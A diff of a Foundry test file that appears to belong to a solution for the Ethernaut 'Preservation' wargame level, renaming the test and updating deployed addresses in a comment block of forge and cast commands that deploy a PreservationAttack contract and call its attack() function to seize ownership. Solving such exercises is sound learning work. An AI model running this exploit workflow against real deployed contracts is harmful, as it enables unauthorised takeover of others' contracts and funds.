@@ -24,7 +24,7 @@ contract PreservationTest is Test {
         preservation = new Preservation(address(lib1), address(lib2));
     }
 
-    function test_changeOwner() public {
+    function test_preservationAttack() public {
         vm.startPrank(attacker);
 
         attackContract = new PreservationAttack(address(preservation));
@@ -44,15 +44,17 @@ contract PreservationTest is Test {
 
 /*
 source .env
-export preservation=0x5d1712c264329FBEeaA98aF3271d55cD73f49965
+export preservation=0x95d955B7f64e0718E7F575b1f03c2795563c6613
 
 forge create solutions/PreservationAttack.sol:PreservationAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $preservation
 
-export attack=0xad4596A2C58246032a86D36bCb2804b32d6D1ee5
+export attackContract=0x62B34b6e56D51b1F23a4Ca1383006c8425Cd2A07
 
 cast call $preservation "timeZone1Library()" --rpc-url $RPC_URL
 cast call $preservation "timeZone2Library()" --rpc-url $RPC_URL
 cast call $preservation "owner()" --rpc-url $RPC_URL
 
-cast send $attack "attack()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
+cast send $attackContract "attack()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
+
+forge test --match-test test_preservationAttack --fork-url $RPC_URL
 */
